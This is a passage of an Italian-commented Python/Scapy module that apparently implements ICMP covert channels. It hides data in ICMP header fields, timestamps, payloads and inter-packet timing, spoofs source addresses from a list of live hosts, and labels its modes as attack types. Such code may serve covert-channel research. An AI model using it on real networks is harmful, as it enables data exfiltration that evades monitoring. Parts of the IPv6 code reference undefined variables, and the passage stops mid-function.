                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/ Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_SOURCE_QUENCH)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface)  

        def ipv4_redirect(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_REDIRECT=5    
            for index in range(0, len(data), 9): 
                #icmp_id=(data[index]<<8)+data[index+1]
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                            len=int.from_bytes(data[index:index+2]), 
                            id=int.from_bytes(data[index+2:index+4]), 
                            ttl=int.from_bytes(data[index+4:index+5])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_REDIRECT)/bytes(dummy_ip)[:28]
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_REDIRECT)/bytes(dummy_ip)[:28]
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 

        def ipv4_echo_campi(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                raise Exception(f"IP version is not 4: {self.ip_dst.version}") 
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}") 
            for index in range(0, len(data), 2): 
                if index==len(data)-1 and len(data)%2!=0:
                    icmp_id=(data[index]<<8)
                else:
                    icmp_id=(data[index]<<8)+data[index+1] 
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY,id=icmp_id)
                pkt.summary()
                #pkt.show()
                #ans = srp1(pkt, verbose=1, iface=self.interface)  usando le replynon ritoranno niente
                sendp(pkt, verbose=1, iface=self.interface) 
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY,id=0,seq=1)
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
        
        def ipv4_echo_payload(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                raise Exception(f"IP version is not 4: {self.ip_dst.version}") 
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            min_block=32 #byte
            max_block=64 #byte 

            identifier=0
            for i in range(0,len(data),max_block): 
                identifier+=1
                sequenza=math.ceil(i/max_block) 
                try:
                    #print("Invio blocco di dati da ",i," a ",i+max_block)
                    #print("Identifier: ",identifier," Sequenza: ",sequenza) 
                    pkt = ( 
                        Ether(dst=self.target_mac)
                        / IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed) 
                        / ICMP(type=TYPE_ECHO_REPLY, id=identifier, seq=0) 
                        / data[i:i+max_block] 
                    ) 
                    sendp(pkt, verbose=1, iface=self.interface) 
                except IndexError as e:
                    print("Errore nell'estrazione del blocco di dati: ",e)
                #pkt = (
                #    Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed) 
                #    / ICMP(type=TYPE_ECHO_REPLY,id=i, seq=sequenza) 
                #    / data[i:i+max_block]
                #)
                #sendp(pkt, verbose=1, iface=self.interface)  

        def ipv4_echo_random_payload(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                raise Exception(f"IP version is not 4: {self.ip_dst.version}") 
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            min_block=32 #byte 
            max_block=64 #byte 
            i=0
            while i<len(data): 
                size=int(random.uniform(min_block,max_block))
                if (i+size)>len(data): 
                    size=len(data)-i  
                pkt = ( 
                    Ether(dst=self.target_mac)
                    / IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed) 
                    / ICMP(type=TYPE_ECHO_REPLY, id=size) 
                    / data[i:i+size] 
                ) 
                #pkt.summary()
                i+=size
                sendp(pkt, verbose=1, iface=self.interface) 
        
        def ipv4_echo_campi_payload(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                raise Exception(f"IP version is not 4: {self.ip_dst.version}") 
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0    
            min_block=32 #byte
            max_block=64 #byte 
            #print("DATI da mandare: ",data)
            for index in range(0, len(data), 2+max_block): 
                if index==len(data)-1 and len(data)%2!=0:
                    icmp_id=(data[index]<<8)
                else:
                    icmp_id=(data[index]<<8)+data[index+1] 
                pkt= (
                    Ether(dst=self.target_mac)
                    / IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)
                    / ICMP(type=TYPE_ECHO_REPLY,id=icmp_id) 
                    / data[index+2:index+(2+max_block)]
                )
                #pkt.summary()
                #pkt.show()
                #ans = srp1(pkt, verbose=1, iface=self.interface)  usando le replynon ritoranno niente
                sendp(pkt, verbose=1, iface=self.interface) 
            pkt= (
                Ether(dst=self.target_mac)
                / IP(dst=self.ip_dst.compressed)
                /ICMP(type=TYPE_ECHO_REPLY,id=0,seq=1)
            )
            #pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 

        def ipv4_timestamp_reply(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_TIMESTAMP_REQUEST=13 
            TYPE_TIMESTAMP_REPLY=14 
            max_block=32 #byte
            for index in range(0, len(data), 5): 
                try:
                    icmp_id=icmp_id=(data[index]<<8)+data[index+1]  
                except IndexError as e: 
                    icmp_id=(data[index]<<8)
                
                current_time=datetime.now(timezone.utc) 
                midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

                data_pkt=int.from_bytes(data[index+2:index+3]) *10**3 
                print("Tempo prima: ",current_time)
                current_time=current_time.replace(microsecond=data_pkt) 
                print("Tempo dopo: ",current_time)
                icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
                print("Tempo campo: ",icmp_ts_ori) 
                print("Dati nasocsti: ",data[index+2:index+3],"\t",int.from_bytes(data[index+2:index+3])) 
                print("Dati nasocsti: ",data[index+3:index+4],"\t",int.from_bytes(data[index+3:index+4]))
                print("Dati nasocsti: ",data[index+4:index+5],"\t",int.from_bytes(data[index+4:index+5]))
                #icmp_ts_ori= int.from_bytes(data[index+2:index+5])  #(ms_since_midnight << 24) |  

                data_pkt=int.from_bytes(data[index+3:index+4]) *10**3
                if current_time.second+1<60:
                    current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
                else:
                    current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
                icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
                
                data_pkt=int.from_bytes(data[index+4:index+5]) *10**3
                if current_time.second+1<60:
                    current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
                else:
                    current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
                icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000) 

                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP(
                    type=TYPE_TIMESTAMP_REPLY
                    ,id=icmp_id
                    ,ts_ori=icmp_ts_ori
                    ,ts_rx=icmp_ts_rx
                    ,ts_tx=icmp_ts_tx
                )/ data[index+5:index+max_block]
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface)  
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_TIMESTAMP_REPLY,id=0,seq=1)
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 

        def ipv4_information_reply(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                raise Exception(f"IP version is not 4: {self.ip_dst.version}") 
            TYPE_INFORMATION_REQUEST=15
            TYPE_INFORMATION_REPLY=16
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            for index in range(0, len(data), 2): 
                if index==len(data)-1 and len(data)%2!=0:
                    icmp_id=(data[index]<<8)
                else:
                    icmp_id=(data[index]<<8)+data[index+1] 
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP(type=TYPE_INFORMATION_REPLY,id=icmp_id)
                pkt.summary()
                #pkt.show()
                #ans = srp1(pkt, verbose=1, iface=self.interface)  usando le replynon ritoranno niente
                sendp(pkt, verbose=1, iface=self.interface) 
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_INFORMATION_REPLY,id=0,seq=1)
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 

        #SINO A QUI
        def ipv4_timing_channel_1bit(self, data:bytes=None): #Exec Time 0:08:33.962674
            #Nella comunicazione possono verificarsi turbolenze. 
            #Per poter distinguere i due tempi la distanza deve essere adeguata. 
            #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore  
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            print(f"Interfaccia per destinazione: {self.interface}")
            TEMPO_0=3 #sec
            DISTANZA_TEMPI=2 #sec
            TEMPO_1=8 #sec
            if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
                raise ValueError("send_timing_cc: TEMPO_1 non valido")
            TEMPO_BYTE=0*60 #minuti
            
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)

            bit_data=[]
            for piece_data in data: #byte aggiunti in BIG ENDIAN 
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #bit aggiunti in LSB 
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
            start_time=datetime.datetime.now(datetime.timezone.utc) 
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
            for piece_bit_data in bit_data:
                for bit in piece_bit_data:
                    if bit: 
                        time.sleep(TEMPO_1) 
                    else: 
                        time.sleep(TEMPO_0)
                    current_time=datetime.datetime.now(datetime.timezone.utc)
                    pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                    pkt.summary()
                    #pkt.show()
                    sendp(pkt, verbose=1, iface=self.interface) 
                time.sleep(TEMPO_BYTE)
            end_time=datetime.datetime.now(datetime.timezone.utc) 
        
        def ipv4_timing_channel_2bit(self, data:bytes=None): #Exec Time 0:07:20.978946
            #Nella comunicazione possono verificarsi turbolenze. 
            #Per poter distinguere i due tempi la distanza deve essere adeguata. 
            #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            print(f"Interfaccia per destinazione: {self.interface}")
            DISTANZA_TEMPI=2 #sec
            TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
            #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
            TEMPO_BYTE=0*60 #minuti 
            
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)

            bit_data=[]
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
            start_time=datetime.datetime.now(datetime.timezone.utc)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
            for piece_bit_data in bit_data:
                for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]): 
                    time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
                    current_time=datetime.datetime.now(datetime.timezone.utc)
                    pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                    pkt.summary()
                    #pkt.show()
                    sendp(pkt, verbose=1, iface=self.interface)  
                time.sleep(TEMPO_BYTE)
            end_time=datetime.datetime.now(datetime.timezone.utc) 
        
        def ipv4_timing_channel_4bit(self, data:bytes=None): #Exec Time 0:12:00.745110 
            #Nella comunicazione possono verificarsi turbolenze. 
            #Per poter distinguere i due tempi la distanza deve essere adeguata. 
            #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore  
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            print(f"Interfaccia per destinazione: {self.interface}")
            DISTANZA_TEMPI=2 #sec
            TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
            TEMPO_BYTE=0*60 #minuti  
            
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
            
            bit_data=[]
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
            start_time=datetime.datetime.now(datetime.timezone.utc)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface)  
            for piece_bit_data in bit_data:
                for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                    index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                    time.sleep(TEMPI_CODICI[index])  
                    pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                    pkt.summary()
                    #pkt.show()
                    sendp(pkt, verbose=1, iface=self.interface)  
                time.sleep(TEMPO_BYTE)
            end_time=datetime.datetime.now(datetime.timezone.utc) 
        
        def ipv4_timing_channel_8bit(self, data:bytes=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255): 
            if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.integer(min_delay) and IS_TYPE.integer(max_delay) and IS_TYPE.integer(stop_value)):
                raise Exception("test_timing_channel8bit: Argomenti non validi") 
            if min_delay<=0: 
                raise Exception("Valori negativi o nulli non sono accettati")
            if max_delay<=min_delay: 
                raise Exception("Il vlaore masismo non può essere minore di quello minimo") 
            if not (0<=stop_value <=255): 
                raise Exception("Valore stop value non corretto")
            old_time=current_time=time.perf_counter() 
            #self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
            #self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            print(f"MAC di destinazione: {self.target_mac}")
            print(f"Interfaccia per destinazione: {self.interface}")

            pkt = Ether(dst=self.target_mac)/IP(dst=self.ip_dst.compressed)/ICMP() / data 
            sendp(pkt, verbose=1, iface=self.interface) 
            for byte in data:   
                delay=min_delay+(byte/255)*(max_delay-min_delay)
                print(f"Delay :{byte}\t{delay}\n")
                #print(f"Data: {byte}\t{byte-31}\t{type(byte)}\n") 
                time.sleep(delay) 
                
                pkt = Ether(dst=self.target_mac)/IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP() / data 
                #print(f"Sending {pkt.summary()}") 
                sendp(pkt, verbose=1, iface=self.interface) 
            stop_delay = min_delay + (stop_value / 255) * (max_delay - min_delay)
            print(f"[STOP] Inviando byte di stop {stop_value} dopo {stop_delay}") 
            time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
            pkt = Ether(dst=self.target_mac)/IP(dst=self.ip_dst.compressed)/ICMP() / data 
            #print(f"Sending {pkt.summary()}") 
            sendp(pkt, verbose=1, iface=self.interface) 
        
        def ipv4_timing_channel_8bit_noise(self, data:bytes=None, rumore:int=2, min_delay:int=1, max_delay:int=30, stop_value: int = 255, seed:int=4582): 
            if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.integer(rumore) and IS_TYPE.integer(min_delay) and IS_TYPE.integer(max_delay) and IS_TYPE.integer(stop_value) and IS_TYPE.integer(seed)):
                raise Exception("test_timing_channel8bit: Argomenti non validi") 
            if min_delay<=0: 
                raise Exception(f"test_timing_channel8bit: Valore minimo non accettato: {min_delay}")
            if max_delay<=min_delay: 
                raise Exception(f"test_timing_channel8bit: Il valore masismo non può essere minore di quello minimo") 
            if not (0<=stop_value <=255): 
                raise Exception(f"test_timing_channel8bit: Valore stop value non corretto: {stop_value}") 
            #Il rumore serve per non mandare sempre con lo stesso intervallo di tempo. 
            #tuttavia andrà aggiunto al minimo e al massimo per evitare errori nel calcolo del delay
            min_delay+=rumore
            max_delay+=rumore
            #Nel caso non si voglia mettere il rumore scelto nel payload chi ricevere deve avere lo stesso seed 
            random.seed(seed) 
            
            #self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
            #self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
            print(f"MAC di destinazione: {self.target_mac}")
            print(f"Interfaccia per destinazione: {self.interface}") 

            random_delay=random.randint(-rumore, rumore)
            pkt = Ether(dst=self.target_mac)/IP(dst=self.ip_dst.compressed)/ICMP() / Raw(load=(0).to_bytes(signed=True)) 
            sendp(pkt, verbose=1, iface=self.interface) 
            for byte in data:   
                delay=min_delay+(byte/255)*(max_delay-min_delay)
                print(f"Delay:{chr(byte)} {byte}\t{delay}") 
                random_delay=random.randint(-rumore, rumore)  
                print("Delay:", delay,"Random delay:", random_delay, delay+random_delay)
                delay=delay+random_delay
                time.sleep(delay) 
                
                pkt = Ether(dst=self.target_mac)/IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed)/ICMP() / Raw(load=random_delay.to_bytes(signed=True)) 
                #print(f"Sending {pkt.summary()}") 
                sendp(pkt, verbose=1, iface=self.interface) 
            stop_delay = min_delay + (stop_value / 255) * (max_delay - min_delay)
            random_delay=random.randint(-rumore, rumore) 
            print(f"[STOP] Inviando byte di stop {stop_value} dopo {stop_delay}") 
            stop_delay=stop_delay+random_delay
            print(f"[STOP] Inviando byte di stop {stop_value} dopo {stop_delay}") 
            time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
            pkt = Ether(dst=self.target_mac)/IP(dst=self.ip_dst.compressed)/ICMP() / Raw(load=random_delay.to_bytes(signed=True))  
            #print(f"Sending {pkt.summary()}") 
            sendp(pkt, verbose=1, iface=self.interface)
    
    class SEND_IPV6(): 
        tipologia=None 
        dst_mac=None
        src_mac=None 
        ip_dst=None
        ip_src=None
        interface=None 
        host_attivi=None 

        def __init__(self, tipologia:Enum=None, ip_dst:ipaddress.IPv4Address=None, host_attivi:list[ipaddress.IPv4Address]=None): 
            if not (IS_TYPE.integer(tipologia) and IS_TYPE.ipaddress(ip_dst) and IS_TYPE.list(host_attivi)): 
                raise Exception(f"Argomenti non corretti") 
            self.tipologia=tipologia
            self.ip_src=NETWORK.IP.find_local_IP() 
            self.ip_dst=ip_dst
            if not (dst_mac:=NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower()): 
                raise Exception(f"Impossibile trovare il MAC per l'IP: {ip_dst.compressed}") 
            if not (src_mac:=NETWORK.get_macAddress(self.ip_src).strip().replace("-",":").lower()): 
                raise Exception(f"Impossibile trovare il MAC per l'IP: {self.ip_src.compressed}")
            self.dst_mac=dst_mac 
            self.src_mac=src_mac 
            print(f"MAC destinazione: {self.dst_mac}") 
            print(f"MAC sorgente: {self.dst_mac}")
            #if not interface and not (interface:=NETWORK.INTERFACE_FROM_IP(ip_dst).interface ): 
            #    raise Exception(f"Impossibile trovare l'interfaccia per l'IP: {ip_dst.compressed}")
            if not (interface:= (NETWORK.INTERFACE_FROM_IP(ip_dst).interface)[0]):
                if interface is None: 
                    interface=NETWORK.DEFAULT_INTERFACE().default_iface
                    NETWORK.ping_once(ip_dst,interface) 
                interface,_= NETWORK.INTERFACE_FROM_IP(ip_dst).interface
                if interface is None:
                    #raise Exception(f"Impossibile trovare l'interfaccia per l'IP: {ip_dst.compressed}") 
                    interface=NETWORK.DEFAULT_INTERFACE().default_iface 
            self.interface=interface 
            print(f"Interfaccia per destinazione: {self.interface}") 
            if host_attivi: 
                self.host_attivi=host_attivi
                print("Host Attivi: ",self.host_attivi)  
            
            dst_mac=NETWORK.IP_INTERFACE.mac_from_ipv6(ip_dst.compressed, ip_src.compressed, interface)  
            src_mac = get_if_hwaddr(interface)  
            #target_mac = NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower() 
            #interface=NETWORK.INTERFACE_FROM_IP(ip_dst).interface 
        
        def send_data(self, data:bytes=None): 
            if not (IS_TYPE.bytes(data) ): 
                raise Exception(f"Argomenti non corretti") 
            match self.tipologia: 
                case AttackType.ipv6_information_reply: 
                    self.ipv6_information_reply(data, self.ip_dst)
                case AttackType.ipv6_parameter_problem: 
                    self.ipv6_parameter_problem(data, self.ip_dst)
                case AttackType.ipv6_time_exceeded: 
                    self.ipv6_time_exceeded(data, self.ip_dst)
                case AttackType.ipv6_packet_to_big: 
                    self.ipv6_packet_to_big(data, self.ip_dst)
                case AttackType.ipv6_destination_unreachable: 
                    self.ipv6_destination_unreachable(data, self.ip_dst)
                case _: raise Exception(f"Tipologia non conosciuta: {self.tipologia}") 

        def ipv6_information_reply(self, data:bytes=None): 
            if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(self.ip_src) and IS_TYPE.ipaddress(self.ip_dst)): 
                raise Exception(f"Argomenti non corretti") 
            if not self.dst_mac or not self.src_mac: 
                raise Exception("Indirizzi MAC non validi")
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.ipaddress(self.ip_src): 
                raise Exception("Indirizzi IP non validi")
            if self.ip_dst.version!=6: 
                raise Exception("IP version is not 6: ",self.ip_dst.version) 

            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129 
            for index in range(0, len(data), 2): 
                if index==len(data)-1 and len(data)%2!=0:
                    icmp_id=(data[index]<<8) 
                else:
                    icmp_id=(data[index]<<8)+data[index+1] 
                pkt= (
                    Ether(dst=self.dst_mac, src=self.src_mac)
                    /IPv6(dst=f"{ip_dst.compressed}%{self.interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed)
                    /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=icmp_id)
                )
                #print(f"Sending {pkt.summary()}") 
                ans = sendp(pkt, verbose=1,iface=self.interface) 
            pkt= (
                Ether(dst=self.dst_mac, src=self.src_mac)
                /IPv6(dst=f"{ip_dst.compressed}%{self.interface}",src=self.ip_src.compressed)
                /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
                / Raw(load="Hello Neighbour".encode())
            )
            #print(f"Sending {pkt.summary()}") 
            ans = sendp(pkt, verbose=1,iface=self.interface) 
            if ans: 
                return True  
            return False 
        
        def ipv6_parameter_problem(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            TYPE_PARAMETER_PROBLEM=4  
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129  
            
            for index in range(0, len(data), 8):  
                dummy_pkt=(
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=int.from_bytes(data[index+4:index+6]))  /
                    ICMPv6EchoRequest(
                        type=TYPE_INFORMATION_REQUEST,
                        id=int.from_bytes(data[index+6:index+8]), 
                        seq=0
                    )
                )
                pkt=(
